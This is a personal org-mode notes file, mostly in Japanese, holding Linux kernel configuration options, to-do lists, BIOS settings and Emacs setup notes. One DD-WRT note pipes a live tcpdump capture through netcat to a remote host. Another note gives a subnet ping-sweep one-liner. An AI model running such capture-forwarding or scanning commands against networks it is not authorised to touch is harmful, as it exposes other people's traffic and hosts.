**** External Connector Class (extcon) support  

**** Memory Controller drivers  

**** Industrial I/O support  

**** Non-Transparent Bridge support  

**** VME bridge support  

**** Pulse-Width Modulation (PWM) Support  

**** IndustryPack bus support  

**** Reset Controller Support  

**** FMC support  

**** PHY Subsystem  

**** Generic powercap sysfs driver  

**** MCB support  

**** Thunderbolt support for Apple devices  

**** Android  

**** NVDIMM (Non-Volatile Memory Device) Support  

*** Firmware Drivers
    | BIOS Enhanced Disk Drive calls determine boot disk |   |
    | Sets default behavior for EDD detection to off     |   |
    | BIOS update support for DELL systems via sysfs     |   |
    | Dell Systems Management Base Driver                |   |
    | Export DMI identification via sysfs to userspace   |   |
    | DMI table support in sysfs                         |   |
    | iSCSI Boot Firmware Table Attributes               |   |
    | iSCSI Boot Firmware Table Attributes module        |   |
    | Google Firmware Drivers                            |   |

**** EFI (Extensible Firmware Interface) Support
    | EFI Variable Support via sysfs                       |   |
    | Register efivars backend for pstore                  |   |
    | Disable using efivars as a pstore backend by default |   |
    | Export efi runtime maps to sysfs                     |   |

*** File systems

   | Second extended fs support                              |                                                                                                                                                 |
   | Ext2 extended attributes                                |                                                                                                                                                 |
   | Ext2 POSIX Access Control Lists                         |                                                                                                                                                 |
   | Ext2 Security Labels                                    |                                                                                                                                                 |
   | Ext3 journalling file system support                    |                                                                                                                                                 |
   | Default to 'data=ordered' in ext3                       |                                                                                                                                                 |
   | Ext3 extended attributes                                |                                                                                                                                                 |
   | Ext3 POSIX Access Control Lists                         |                                                                                                                                                 |
   | Ext3 Security Labels                                    |                                                                                                                                                 |
   | The Extended 4 (ext4) filesystem                        |                                                                                                                                                 |
   | Ext4 POSIX Access Control Lists                         |                                                                                                                                                 |
   | Ext4 Security Labels                                    |                                                                                                                                                 |
   | Ext4 Encryption                                         |                                                                                                                                                 |
   | EXT4 debugging support                                  |                                                                                                                                                 |
   | JBD2 (ext4) debugging support                           |                                                                                                                                                 |
   | Reiserfs support                                        |                                                                                                                                                 |
   | Enable reiserfs debug mode                              |                                                                                                                                                 |
   | Stats in /proc/fs/reiserfs                              |                                                                                                                                                 |
   | ReiserFS extended attributes                            |                                                                                                                                                 |
   | ReiserFS POSIX Access Control Lists                     |                                                                                                                                                 |
   | ReiserFS Security Labels                                |                                                                                                                                                 |
   | JFS filesystem support                                  |                                                                                                                                                 |
   | JFS POSIX Access Control Lists                          |                                                                                                                                                 |
   | JFS Security Labels                                     |                                                                                                                                                 |
   | JFS debugging                                           |                                                                                                                                                 |
   | JFS statistics                                          |                                                                                                                                                 |
   | XFS filesystem support                                  |                                                                                                                                                 |
   | XFS Quota support                                       |                                                                                                                                                 |
   | XFS POSIX ACL support                                   |                                                                                                                                                 |
   | XFS Realtime subvolume support                          |                                                                                                                                                 |
   | XFS Verbose Warnings                                    |                                                                                                                                                 |
   | XFS Debugging support                                   |                                                                                                                                                 |
   | GFS2 file system support                                |                                                                                                                                                 |
   | GFS2 DLM locking                                        |                                                                                                                                                 |
   | OCFS2 file system support                               |                                                                                                                                                 |
   | O2CB Kernelspace Clustering                             |                                                                                                                                                 |
   | OCFS2 Userspace Clustering                              |                                                                                                                                                 |
   | OCFS2 logging support                                   |                                                                                                                                                 |
   | OCFS2 expensive checks                                  |                                                                                                                                                 |
   | Btrfs filesystem support                                |                                                                                                                                                 |
   | NILFS2 file system support                              |                                                                                                                                                 |
   | F2FS filesystem support                                 |                                                                                                                                                 |
   | Direct Access (DAX) support                             |                                                                                                                                                 |
   | Dnotify support                                         |                                                                                                                                                 |
   | Inotify support for userspace                           |                                                                                                                                                 |
   | Filesystem wide access notification                     |                                                                                                                                                 |
   | fanotify permissions checking                           |                                                                                                                                                 |
   | Quota support                                           | ユーザー毎のディスクの使用容量を制限できる機能をサポートします。個人で Linux を使う場合は不要でしょう。                                         |
   | Report quota messages through netlink interface         |                                                                                                                                                 |
   | Print quota warnings to console (OBSOLETE)              |                                                                                                                                                 |
   | Additional quota sanity checks                          |                                                                                                                                                 |
   | Old quota format support                                |                                                                                                                                                 |
   | Quota format vfsv0 and vfsv1 support                    |                                                                                                                                                 |
   | Kernel automounter version 4 support (also supports v3) | リモートファイルシステムを自動でマウントする機能をサポートします。大規模な分散されたネットワークの一部でないなら、不要らしいので「 n 」にします。 |
   | FUSE (Filesystem in Userspace) support                  | 独自のファイルシステムを作成できる機能 sshfs など                                                                                               |
   | Character device in Userspace support                   |                                                                                                                                                 |
   | Overlay filesystem support                              |                                                                                                                                                 |

**** Caches
     | General filesystem local caching manager           |   |
     | Gather statistical information on local caching    |   |
     | Gather latency information on local caching        |   |
     | Debug FS-Cache                                     |   |
     | Maintain global object list for debugging purposes |   |
     | Filesystem caching on files                        |   |
     | Debug CacheFiles                                   |   |
     | Gather latency information on CacheFiles           |   |
  
**** CD-ROM/DVD Filesystems 
     | ISO 9660 CDROM file system support  | ISO9660 という CDROM で使用される標準的なファイルシステムをサポートします。 |
     | Microsoft Joliet CDROM extensions   |                                                                          |
     | Transparent decompression extension |                                                                          |
     | UDF file system support             |                                                                          |
  
**** DOS/FAT/NT Filesystems 
     | MSDOS fs support             |   |
     | VFAT (Windows-95) fs support |   |
     | Default codepage for FAT     |   |
     | Default iocharset for FAT    |   |
     | NTFS file system support     |   |
     | NTFS debugging support       |   |
     | NTFS write support           |   |

**** Pseudo filesystems 
     | /proc/kcore support                                      |   |
     | /proc/vmcore support                                     |   |
     | Include /proc/<pid>/task/<tid>/children file             |   |
     | Tmpfs virtual memory file system support (former shm fs) |   |
     | Tmpfs POSIX Access Control Lists                         |   |
     | Tmpfs extended attributes                                |   |
     | HugeTLB file system support                              |   |
     | Userspace-driven configuration filesystem                |   |
     | EFI Variable filesystem                                  |   |
  
**** Miscellaneous filesystems 
     | ADFS file system support                                   | Acorn Disc Filing System (ADFS) という RiscOS で標準的に使用されるファイルシステムをサポートします。 |
     | Amiga FFS file system support                              |                                                                                                    |
     | eCrypt filesystem layer support                            |                                                                                                    |
     | Apple Macintosh file system support                        | Machintosh のファイルシステムをサポートします。                                                    |
     | Apple Extended HFS file system support                     |                                                                                                    |
     | HFS+ POSIX Access Control Lists                            |                                                                                                    |
     | BeOS file system (BeFS) support (read only)                |                                                                                                    |
     | BFS file system support                                    |                                                                                                    |
     | EFS file system support (read only)                        |                                                                                                    |
     | Journalling Flash File System v2 (JFFS2) support           |                                                                                                    |
     | JFFS2 debugging verbosity (0 = quiet, 2 = noisy)           |                                                                                                    |
     | JFFS2 write-buffering support                              |                                                                                                    |
     | Verify JFFS2 write-buffer reads                            |                                                                                                    |
     | JFFS2 summary support                                      |                                                                                                    |
     | JFFS2 XATTR support                                        |                                                                                                    |
     | Advanced compression options for JFFS2                     |                                                                                                    |
     | JFFS2 ZLIB compression support                             |                                                                                                    |
     | JFFS2 LZO compression support                              |                                                                                                    |
     | JFFS2 RTIME compression support                            |                                                                                                    |
     | JFFS2 RUBIN compression support                            |                                                                                                    |
     | UBIFS file system support                                  |                                                                                                    |
     | Advanced compression options                               |                                                                                                    |
     | LZO compression support                                    |                                                                                                    |
     | ZLIB compression support                                   |                                                                                                    |
     | LogFS file system                                          |                                                                                                    |
     | Compressed ROM file system support (cramfs) (OBSOLETE)     |                                                                                                    |
     | SquashFS 4.0 - Squashed file system support                |                                                                                                    |
     | File decompression options (Decompress file data into an   |                                                                                                    |
     | Decompressor parallelisation options (Single threaded com  |                                                                                                    |
     | Squashfs XATTR support                                     |                                                                                                    |
     | Include support for ZLIB compressed file systems           |                                                                                                    |
     | Include support for LZ4 compressed file systems            |                                                                                                    |
     | Include support for LZO compressed file systems            |                                                                                                    |
     | Include support for XZ compressed file systems             |                                                                                                    |
     | Use 4K device block size?                                  |                                                                                                    |
     | Additional option for memory-constrained systems           |                                                                                                    |
     | FreeVxFS file system support (VERITAS VxFS (TM) compatible) |                                                                                                    |
     | Minix file system support                                  |                                                                                                    |
     | SonicBlue Optimized MPEG File System support               |                                                                                                    |
     | OS/2 HPFS file system support                              | HPFS は OS/2 という OS 用のファイルシステムです。                                                  |
     | QNX4 file system support (read only)                       | QNX4 という OS で使用されているファイルシステムをサポートします。                                     |
     | QNX6 file system support (read only)                       |                                                                                                    |
     | ROM file system support                                    |                                                                                                    |
     | Persistent store support                                   |                                                                                                    |
     | Log kernel console messages                                |                                                                                                    |
     | Log user space messages                                    |                                                                                                    |
     | Log panic/oops to a RAM buffer                             |                                                                                                    |
     | System V/Xenix/V7/Coherent file system support             |                                                                                                    |
     | UFS file system support (read only)                        | BSD から派生した各種の UNIX の UFS というファイルシステムをサポートします。                             |
     | UFS file system write support (DANGEROUS)                  |                                                                                                    |
     | UFS debugging                                              |                                                                                                    |
     | exofs: OSD based file system support                       |                                                                                                    |
     | Enable debugging                                           |                                                                                                    |

***** JFFS2 default compression mode (priority)
***** RomFS backing stores (Both the above)

**** Network File Systems 
     | NFS client support                                          |                                                                               |
     | NFS client support for NFS version 2                        |                                                                               |
     | NFS client support for NFS version 3                        |                                                                               |
     | NFS client support for the NFSv3 ACL protocol extension     |                                                                               |
     | NFS client support for NFS version 4                        |                                                                               |
     | Provide swap over NFS support                               |                                                                               |
     | NFS client support for NFSv4.1                              |                                                                               |
     | NFS client support for NFSv4.2                              |                                                                               |
     | NFSv4.1 client support for migration                        |                                                                               |
     | Provide NFS client caching support                          |                                                                               |
     | Use the legacy NFS DNS resolver                             |                                                                               |
     | NFS server support                                          |                                                                               |
     | NFS server support for NFS version 3                        |                                                                               |
     | NFS server support for the NFSv3 ACL protocol extension     |                                                                               |
     | NFS server support for NFS version 4                        |                                                                               |
     | Secure RPC: Kerberos V mechanism                            |                                                                               |
     | RPC: Enable dprintk debugging                               |                                                                               |
     | RPC-over-RDMA transport                                     |                                                                               |
     | Ceph distributed file system                                |                                                                               |
     | CIFS support (advanced network filesystem, SMBFS successor) |                                                                               |
     | CIFS statistics                                             |                                                                               |
     | Support legacy servers which use weaker LANMAN security     |                                                                               |
     | Kerberos/SPNEGO advanced session setup                      |                                                                               |
     | CIFS extended attributes                                    |                                                                               |
     | CIFS POSIX Extensions                                       |                                                                               |
     | Provide CIFS ACL support                                    |                                                                               |
     | Enable CIFS debugging routines                              |                                                                               |
     | Enable additional CIFS debugging routines                   |                                                                               |
     | DFS feature support                                         |                                                                               |
     | SMB2 and SMB3 network file system support                   |                                                                               |
     | Provide CIFS client caching support                         |                                                                               |
     | NCP file system support (to mount NetWare volumes)          |                                                                               |
     | Packet signatures                                           |                                                                               |
     | Proprietary file locking                                    |                                                                               |
     | Clear remove/delete inhibit when needed                     |                                                                               |
     | Use NFS namespace if available                              |                                                                               |
     | Use LONG (OS/2) namespace if available                      |                                                                               |
     | Lowercase DOS filenames                                     |                                                                               |
     | Use Native Language Support                                 |                                                                               |
     | Enable symbolic links and execute flags                     |                                                                               |
     | Coda file system support (advanced network fs)              | NFS に似ている進歩的なネットワークファイルシステムである Coda をサポートします。 |
     | Andrew File System support (AFS)                            |                                                                               |
     | Plan 9 Resource Sharing Support (9P2000)                    |                                                                               |
     | Enable 9P client caching support                            |                                                                               |
     | 9P POSIX Access Control Lists                               |                                                                               |
     | 9P Security Labels                                          |                                                                               |
  
**** Native language support 
     Microsoft の FAT ファイルシステムが保持するコードページを設定します。すべてをモジュール化しました。

**** Distributed Lock Manager (DLM) 
     | DLM debugging |   |

*** Kernel hacking
     | Magic SysRq key                                             |   |
     | Kernel debugging                                            |   |
     | Panic on Oops                                               |   |
     | panic timeout                                               |   |
     | Enable extra timekeeping sanity checking                    |   |
     | Stack backtrace support                                     |   |
     | Remote debugging over FireWire early on boot                |   |
     | Enable debugging of DMA-API usage                           |   |
     | Test module loading with 'hello world' module               |   |
     | Test user/kernel boundary protections                       |   |
     | Test BPF filter functionality                               |   |
     | Test firmware loading via userspace interface               |   |
     | udelay test driver                                          |   |
     | Memtest                                                     |   |
     | Filter access to /dev/mem                                   |   |
     | Enable verbose x86 bootup info messages                     |   |
     | Set loadable kernel module data as NX and text as RO        |   |
     | Enable IOMMU stress-test mode                               |   |
     | IO delay type (port 0x80 based port-IO delay [recommended]) |   |
     | Allow gcc to uninline functions marked 'inline'             |   |
     | ATOM Punit debug driver                                     |   |

**** printk and dmesg options
     | Show timing information on printks |   |
     | Default message log level (1-7)    |   |

**** Compile-time checks and compiler options
     | Enable __deprecated logic                         |   |
     | Enable __must_check logic                         |   |
     | Warn for stack frames larger than (needs gcc 4.4) |   |
     | Strip assembler-generated symbols during link     |   |
     | Enable unused/obsolete exported symbols           |   |
     | Debug Filesystem                                  |   |
     | Run 'make headers_check' when building vmlinux    |   |
     | Enable full Section mismatch analysis             |   |
     | Compile the kernel with frame pointers            |   |
  
**** Memory Debugging
     | Extend memmap on extra space for more information on page |   |

**** Debug Lockups and Hangs
**** Lock Debugging (spinlocks, mutexes, etc...)
**** RCU Debugging
     | RCU debugging: sparse-based checks for pointer usage |   |
     | RCU CPU stall timeout in seconds                     |   |
**** Tracers
**** Runtime Testing
     | Perform an atomic64_t self-test at boot                       |   |
     | Self test for hardware accelerated raid6 recovery             |   |
     | Test functions located in the hexdump module at runtime       |   |
     | Test functions located in the string_helpers module at runtim |   |
     | Test kstrto*() family of functions at runtime                 |   |
     | Perform selftest on resizable hash table                      |   |

**** Sample kernel code 

**** Early printk
     | Early printk via EHCI debug port     |   |
     | Early printk via the EFI framebuffer |   |

*** Security options
     | Enable access key retention support                          |   |
     | Enable register of persistent per-UID keyrings               |   |
     | Large payload keys                                           |   |
     | TRUSTED KEYS                                                 |   |
     | ENCRYPTED KEYS                                               |   |
     | Restrict unprivileged access to the kernel syslog            |   |
     | Enable different security models                             |   |
     | Enable the securityfs filesystem                             |   |
     | Socket and Networking Security Hooks                         |   |
     | XFRM (IPSec) Networking Security Hooks                       |   |
     | Security hooks for pathname based access control             |   |
     | NSA SELinux Support                                          |   |
     | Simplified Mandatory Access Control Kernel Support           |   |
     | TOMOYO Linux Support                                         |   |
     | Default maximal count for learning mode                      |   |
     | Default maximal count for audit log                          |   |
     | Activate without calling userspace policy loader.            |   |
     | AppArmor support                                             |   |
     | Yama support                                                 |   |
     | Integrity subsystem                                          |   |
     | Digital signature verification using multiple keyrings       |   |
     | Enables integrity auditing support                           |   |
     | Integrity Measurement Architecture (IMA)                      |   |
     | EVM support                                                  |   |
     | Default security module (Unix Discretionary Access Controls) |   |
  
*** Cryptographic API
     | RSA algorithm                                               |   |
     | Cryptographic algorithm manager                             |   |
     | Userspace cryptographic algorithm configuration             |   |
     | Disable run-time self tests                                 |   |
     | GF (2^128) multiplication functions                          |   |
     | Null algorithms                                             |   |
     | Parallel crypto engine                                      |   |
     | Software async crypto daemon                                |   |
     | Software async multi-buffer crypto daemon                   |   |
     | Authenc support                                             |   |
     | Testing module                                              |   |
     | CCM support                                                 |   |
     | GCM/GMAC support                                            |   |
     | ChaCha20-Poly1305 AEAD support                              |   |
     | Sequence Number IV Generator                                |   |
     | Encrypted Chain IV Generator                                |   |
     | CBC support                                                 |   |
     | CTR support                                                 |   |
     | CTS support                                                 |   |
     | ECB support                                                 |   |
     | LRW support                                                 |   |
     | PCBC support                                                |   |
     | XTS support                                                 |   |
     | CMAC support                                                |   |
     | HMAC support                                                |   |
     | XCBC support                                                |   |
     | VMAC support                                                |   |
     | CRC32c CRC algorithm                                        |   |
     | CRC32c INTEL hardware acceleration                          |   |
     | CRC32 CRC algorithm                                         |   |
     | CRC32 PCLMULQDQ hardware acceleration                       |   |
     | CRCT10DIF algorithm                                         |   |
     | GHASH digest algorithm                                      |   |
     | Poly1305 authenticator algorithm                            |   |
     | MD4 digest algorithm                                        |   |
     | MD5 digest algorithm                                        |   |
     | Michael MIC keyed digest algorithm                          |   |
     | RIPEMD-128 digest algorithm                                 |   |
     | RIPEMD-160 digest algorithm                                 |   |
     | RIPEMD-256 digest algorithm                                 |   |
     | RIPEMD-320 digest algorithm                                 |   |
     | SHA1 digest algorithm                                       |   |
     | SHA224 and SHA256 digest algorithm                          |   |
     | SHA384 and SHA512 digest algorithms                         |   |
     | Tiger digest algorithms                                     |   |
     | Whirlpool digest algorithms                                 |   |
     | AES cipher algorithms                                       |   |
     | AES cipher algorithms (i586)                                |   |
     | AES cipher algorithms (AES-NI)                              |   |
     | Anubis cipher algorithm                                     |   |
     | ARC4 cipher algorithm                                       |   |
     | Blowfish cipher algorithm                                   |   |
     | Camellia cipher algorithms                                  |   |
     | CAST5 (CAST-128) cipher algorithm                           |   |
     | CAST6 (CAST-256) cipher algorithm                           |   |
     | DES and Triple DES EDE cipher algorithms                    |   |
     | FCrypt cipher algorithm                                     |   |
     | Khazad cipher algorithm                                     |   |
     | Salsa20 stream cipher algorithm                             |   |
     | Salsa20 stream cipher algorithm (i586)                      |   |
     | ChaCha20 cipher algorithm                                   |   |
     | SEED cipher algorithm                                       |   |
     | Serpent cipher algorithm                                    |   |
     | Serpent cipher algorithm (i586/SSE2)                        |   |
     | TEA, XTEA and XETA cipher algorithms                        |   |
     | Twofish cipher algorithm                                    |   |
     | Twofish cipher algorithms (i586)                            |   |
     | Deflate compression algorithm                               |   |
     | Zlib compression algorithm                                  |   |
     | LZO compression algorithm                                   |   |
     | 842 compression algorithm                                   |   |
     | LZ4 compression algorithm                                   |   |
     | LZ4HC compression algorithm                                 |   |
     | Pseudo Random Number Generation for Cryptographic modules   |   |
     | Jitterentropy Non-Deterministic Random Number Generator     |   |
     | User-space interface for hash algorithms                    |   |
     | User-space interface for symmetric key cipher algorithms    |   |
     | User-space interface for random number generator algorithms |   |
     | User-space interface for AEAD cipher algorithms             |   |

**** NIST SP800-90A DRBG
     | Enable Hash DRBG |   |
     | Enable CTR DRBG  |   |

**** Hardware crypto devices
     | Support for VIA PadLock ACE                   |   |
     | PadLock driver for AES algorithm              |   |
     | PadLock driver for SHA1 and SHA256 algorithms |   |
     | Support for the Geode LX AES engine           |   |
     | Support for AMD Cryptographic Coprocessor     |   |
     | Support for Intel (R) DH895xCC                 |   |
  
**** Asymmetric (public-key cryptographic) key type

*** Virtualization
     | Kernel-based Virtual Machine (KVM) support |   |
     | KVM for Intel processors support           |   |
     | KVM for AMD processors support             |   |
     | Host kernel accelerator for virtio net     |   |
     | VHOST_SCSI TCM fabric driver               |   |
     | Cross-endian support for vhost             |   |
     | Linux hypervisor example code              |   |

*** Library routines
    | CRC-CCITT functions                                |   |
    | CRC16 functions                                    |   |
    | CRC calculation for the T10 Data Integrity Field   |   |
    | CRC ITU-T V.41 functions                           |   |
    | CRC32/CRC32c functions                             |   |
    | CRC32 perform self test on init                    |   |
    | CRC7 functions                                     |   |
    | CRC32c (Castagnoli, et al) Cyclic Redundancy-Check |   |
    | CRC8 function                                      |   |
    | PRNG perform self test on init                     |   |
    | XZ decompression support                           |   |
    | XZ decompressor tester                             |   |
    | glob self-test on init                             |   |
    | Averaging functions                                |   |
    | CORDIC algorithm                                   |   |
    | JEDEC DDR data                                     |   |
    | Select compiled-in fonts                           |   |

**** CRC32 implementation (Slice by 8 bytes)


* ----- Sepalater -----
* Note:
** インターネットカフェ task
   - shutdown
*** 32G
	- USB32G 起動確認
	- ssh-agent
	- WOL
	  python wol.py
	- sshfs

*** 4G
**** WOL 確認
	 - 環境変数
	   send hotkey #f1

	 - wakeup
	   send hotkey ^+#z
	   wait 40 seconds
	   send hotkey ^#z

	 - scpki

** error framework
   - ミススペルのチェック
   - root であるか確認
** TODO snmp
   read snmp oreilly pdf
   read security acessment oreilly pdf



   <2011-06-17 Fri>
** TODO exchange server
   通信暗号化
   将来性


   <2011-08-01 Mon>
** TODO test aptitude purge xfonts-encodings xfonts-unifont xfonts-utils
   test on test server


   <2011-08-30 Tue>
** TODO backup
   zshrc の backup の方法を考える

   <2011-09-12 Mon>
**  言葉遣い
	何卒事情ご賢察のうえご寛容下さいませ。

    [[file:~/work/emacs23-23.1%2B1/lisp/files.el::if%20and%20default%20coding][file:~/work/emacs23-23.1+1/lisp/files.el::if and default coding]]
    <2012-10-14 Sun>
**  tcpdump on DD-WRT
tcpdump -D
tcpdump -w - -U -n -s 0 -i ppp0 | nc <ip> 8888

    [[http://emtunc.org/blog/04/2011/installing-tcpdump-on-dd-wrt-wrt54gl/][Installing TCPDump on DD-WRT WRT54GL | emtunc's Blog]]
    <2012-10-29 Mon>
**  嵌った時の対処手順
	1. spell ミス 誤字 脱字


    <2012-11-07 Wed>
<<<<<<< .mine
**  linux desktop
- keybind
- hotstring
**  detect ip
for /L %i in (1,1,254) do ping -w 500 -n 1 192.168.1.%i > nul && arp -a 192.168.1.%i

    [[file:~/work/tor_firwall.sh::do]]

** emacs
(cf. http://www.plusastra.com/2012/11/installing-emacs-24-on-debian-wheezy.html,
     http://willnet.in/72)
- # apt-get build-dep emacs
  # git clone --depth 1 https://github.com/emacsmirror/emacs.git
  # cd emacs/
  # apt-get install autoconf automake
  # apt-get install libxaw7-dev libxpm-dev libpng12-dev libtiff5-dev libgif-dev libjpeg8-dev libmagick++-dev
  # ./autogen.sh
  # ./configure --with-x --without-toolkit-scroll-bars --without-pop --without-selinux --prefix=/opt/emacs24 --without-gconf --enable-link-time-optimization --with-wide-init CFLAGS="-O2"
  # make bootstrap
  # cd src
  # make install

** KI BIOS Setting
*** Standard CMOS Features
*** Advanced BIOS Features
- [First Boot Device] Hard Disk
- [Second Boot Device] Disabled
- [Third Boot Device] Disabled
- [Boot Other Device] Enabled
- [Boot Up NumLock Status] On
- [APIC Mode] Enabled
*** Advanced Chipset Features
**** AGP & P2P Bridge Control
- [AGP Aperture Size] 32MB
**** OnChip VGA Control
- [VGA Share Memory Size] 32MB
*** Integrated Peripherals
- [Onboard FDC Controller] Disabled
- [Onboard Serial Port 1] 3F8/IRQ4
*** Power Management Setup
- [ACPI Suspend Type] S3
- [Wake On PCI Card] Enabled
- [USB Port Wake Up Control] Enabled
- [AMD K8 Cool'n' Quiet control] Auto
** code 赤ペン先生
**  python code
import collections
d = collections.defaultdict (lambda:collections.defaultdict (float))
d['poko']['hoge'] += 1.0
**  test
**  test
**  coding live streaming
coding を live で流してお金を得る。
支払いは見ている人が払う形式。
coding 初心者は coding の流れをしることが出来る。
配信している人はお金を得て coding を指摘してもらうことが出来
る。
**  my search 
my local web server
search like google my log
history web 
add local my server
* Todo:
*** 設計の設計
**** TODO なぜ 5
     - このシステムの目的（価値）は？
     - どのような責務を持つ人に使われるのか？
     - どのような外部システムとかかわるのか？
     - システムはどのような使われ方をするのか？　
     - システムとの接点は？
     - その時の入出力情報は？
     - システムに必要な機能は？
     - その機能が使用するデータは？
***** Functionality (機能)
	  - 機能要求
	  - セキュリティ
	  - 汎用性
	  - 将来性
***** Usability (操作性)
      - 使い易さ、分かり易さ
	  - 整合性
	  - 見栄え
	  - 利用マニュアル
***** Reliability (信頼性)
	  - 平均故障時間
	  - 平均故障間隔
	  - 可用性
	  - 故障頻度と深刻さ
	  - 復旧性
	  - 正確さ
      - 予見性
***** Performance (性能)
	  - 処理速度
	  - スループット
	  - 応答時間
	  - リソースの消費量

***** Supportability (保守性)
	  - テストのしやすさ
	  - 拡張性
	  - 適応性
	  - 保守性
	  - 運用性
	  - 構成のしやすさ
	  - インストールのしやすさ
	  - ローカライズのしやすさ

***** Plus (その他)
      - 関係する法律
**** 設計手順
     1. 調査
     2. 設計
     3. 実装
     4. Summary
     5. 重要な要素から設計 :: 後になる程、集中力が落る。
**** 構成作成
- 本の目次から参考にする。
**** 目標 (期待成果)
	 - 時間の削減
***** TODO 簡単に環境を構築できるようにする。
      - OS を再インストールした時などでも，簡単に自分の環境に近い
		ものを構築できるようにする。
		インターネットからダウンロードできるようにする。
***** TODO 文字を一切間違いのないようにする。
	  spell も同じ。

      [[file:~/.emacs.d/ebackup/.svn]]
      <2011-09-17 Sat>

***** TODO コマンド統合
   	  upcase
   	  region が設定されていれば region-upcase
   	  初めてコマンドが実行されカーソル下が小文字なら upcase-char
   	  lastcommand = thiscommand でカーソル下が大文字なら upcase-word

   	  [[file:~/mydoc/memo/memo.org::*Super%20key%20script][Super key 処理の長い script などを割り当てる]]
   	  <2012-10-29 Mon>

**** apropos
apropos で kill delete などのコマンドをさがして設計を考える。

** TODO architect of architecture
*** 要件定義の計画と基準作成 (設計の計画)
**** 調査計画作成
**** 調査分析
**** 見直し
** TODO 道具
*** TODO keybord
- 気になった keybord は買って使って試す。高い物はオークションで
  売る。
- happy hacking
- realforce
*** TODO 椅子
*** TODO 机
*** TODO 部屋
*** TODO ディスプレイ
*** TODO Foot switch
- 怪我した時用に ctrl の代わりに
** TODO インターネットから usb の環境をダウンロードできる仕組みを構築
- putty portforward winscp など、サーバーにアクセスしてデー
  タをダウンロードできる最小限のものを archive 化する。
  A_drive などのサイトにアップロードしておく。
** TODO autohotkey on linux

   [[file:~/.emacs.d/init/view_init.el::Color]]
   <2011-10-05 Wed>
** TODO 正規表現をマスター
   - auto-insert の正規表現を編集
** TODO bookmarklet を種類別にまとめる
** TODO zsh
   completion
   aireplay-ng

   [[file:/data/mydoc/security/penlinux::*Discovery%20Live%20Hosts][Discovery Live Hosts]]
   <2011-10-17 Mon>
** TODO アルゴリズム辞典を作成
** TODO [#B] 正規表現 アルゴリズム

    [[file:~/work/emacs_architect.org::*Maintenance][Maintenance]]
    <2012-11-19 Mon>
** TODO [#C] winscp sync error
like 'http://' file name cannot create unix file name.

    [[file:l:/Autohotkey/script/weekly.ahk]]
** TODO [#C] rook tcpdump python script
        while 1:
            data = conn.recv (blocksize)
            if not data:
                break
            callback (data)
        conn.close ()
    [[file:/etc/crontab]]
** TODO [#C] bus stop timetable check if changed
** TODO [#B] /data all exe 7z archive to normal 7z
** TODO [#C] create printer setting script bat or python
    windows
** TODO [#C] king rook refactoring
** TODO [#C] Leukocyte program
** TODO [#C] generate test code for python
use imenu or py:
    
    [[file:/usr/lib/python2.7/dist-packages/wx-2.8-gtk2-unicode/wx/_core.py]]

* Emacs:
** TODO code reading
   pymacs.el pymacs-round-trip ()

   [[file:/usr/share/emacs/site-lisp/pymacs/pymacs.el::marker%20position%20marker%20limit%20position][file:/usr/share/emacs/site-lisp/pymacs/pymacs.el::marker position marker limit position]]
   <2011-09-29 Thu>
*** mwe-color-box
	read source and create new el

*** TODO yasnippet
** TODO 括弧
   括弧の lisp 括弧が対応していれば終括弧、
   対応していなければ snippet で"$1"$0 を挿入
   - paredit.el ()
** TODO 日記
   - 外部からのメールの一部を記録
*** Calendar mode で org を作る
*** テンプレート作成
	日付
	天気
	いつ誰がどこで何をどのようになぜ snippet
	失敗事項 faile
*** 検索性
*** どこからでも記録、参照
**** web ブラウザで記録
**** メールで記録
	 - デメリット: メールは盗聴、
	   外部サーバーに記録が残る可能性が高い。
*** 1 年 1 ファイル
	- 2011.org
**** January
***** 1 (mon)
	  天気:晴

***** 2 (tus)
***** 3 (wen)
***** 4
***** 5
***** 6
***** 7
***** 8
***** 9
***** 10
***** 11
***** 12
***** 13
***** 14
***** 15
***** 16
***** 17
***** 18
***** 19
***** 20
***** 21
***** 22
***** 23
***** 24
***** 25
***** 26
***** 27
***** 28
***** 29
***** 30
***** 31
**** February
**** March
**** April
**** May
**** June
**** July
**** August
**** September
**** October
**** November
**** December
** TODO [0/2]anything
*** TODO moccur の状態を keep する

    [[file:~/.emacs.d/init/plugin_init.el::global%20set%20key%20C%20M%20f%20anything%20c%20moccur%20occur%20by%20moccur][file:~/.emacs.d/init/plugin_init.el::global set key C M f anything c moccur occur by moccur]]
    <2011-09-17 Sat>

*** TODO [#B] anything
	anything-c-adaptive-history の設定
	history が保存されないので修正

    [[file:~/.emacs.d/init/plugin/plugin_essential_init.el::setq%20anything%20c%20adaptive%20history%20file][file:~/.emacs.d/init/plugin/plugin_essential_init.el::setq anything c adaptive history file]]
    <2011-09-23 Fri>
** TODO [#C] multi-term
   screen terminal をタブにする。

   [[file:~/.emacs.d/init/plugin/plugin_essential_init.el::add%20hook][file:~/.emacs.d/init/plugin/plugin_essential_init.el::add hook]]
   <2011-09-19 Mon>
** TODO org-mode
   M-- で head があれば right-heading なければ org-insert-heading

   [[file:~/.emacs.d/init/mode/org_mode_init.el::define%20key%20org%20mode%20map%20kbd%20C%20M%20org%20insert%20heading][file:~/.emacs.d/init/mode/org_mode_init.el::define key org mode map kbd C M org insert heading]]
   <2011-10-06 Thu>

*** TODO [#A] org-remember から org-capture へ移行
    version 23 から 24 へ移行する
    memo.org と all_in_one.org を統合。

    [[http://skalldan.wordpress.com/2011/07/16/%E8%89%B2%E3%80%85-org-capture-%E3%81%99%E3%82%8B-2/][色々 Org Capture する | Amrta]]
    <2012-10-16 Tue>
*** TODO org mode yasnippet
    create link [[][]] の yasnippet

    [[file:~/mydoc/memo/memo.org::*Timeline%205%2014][Timeline {5/14}]]
    <2012-09-15 Sat>
** TODO w3m
*** DONE for windows
    CLOSED: [2013-03-02 06:04]

    [[info:elisp:Creating%20Buffer-Local][info:elisp:Creating Buffer-Local]]
    <2012-09-07 Fri>

*** TODO 検索 コマンド 設定
	gg: で検索できるようにする。
    [[info:elisp:Using%20Interactive][info:elisp:Using Interactive]]
    <2012-09-10 Mon>

*** TODO w3m fix

    [[http://www.google.com/][Google]]
    <2012-09-10 Mon>
** TODO create config mode
- squid config file
- log viewer
- ssh
- selinux

     [[file:~/mydoc/memo/memo.org::*create%20log%20viewer%20mode][create log viewer mode]]
     <2012-09-18 Tue>

*** TODO view tripwire report on emacs

    [[file:/data/mydoc/memo/memo.org]]
    <2011-10-06 Thu>
** TODO python-mode import popup
   python mode で import が書かれた場所を popup


   [[file:~/dev/py/kihalt/kihalt.py::king]]
   <2012-09-29 Sat>
** TODO memo, architecture, daily などの org を統合

